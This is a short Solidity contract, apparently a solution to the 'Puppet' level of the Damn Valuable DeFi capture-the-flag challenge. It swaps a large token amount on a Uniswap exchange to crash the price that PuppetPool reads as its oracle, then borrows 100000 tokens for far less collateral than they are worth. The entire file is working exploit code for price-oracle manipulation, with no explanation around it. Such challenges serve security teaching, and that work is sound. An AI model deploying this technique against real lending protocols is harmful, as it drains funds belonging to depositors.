//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {PuppetPool} from "./PuppetPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

interface IUniswapExchange {
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
}

contract AttackPuppet {
    uint256 amount1 = 1000 ether;
    uint256 amount2 = 100000 ether;
    PuppetPool public pool;
    DamnValuableToken public token;
    IUniswapExchange public exchange;
    address public player;
    uint256 public count;

    event Error(bytes err);

    constructor(address _exchange, address _pool, address _token, address _player) payable {
        exchange = IUniswapExchange(_exchange);
        pool = PuppetPool(_pool);
        token = DamnValuableToken(_token);
        player = _player;
    }

    function swap() public {
        token.approve(address(exchange), amount1);
        exchange.tokenToEthSwapInput(amount1, 1, block.timestamp + 5000);
        uint256 requiredETH = pool.calculateDepositRequired(amount2);
        pool.borrow{value: requiredETH}(amount2, player);
    }

    receive() external payable {}
}
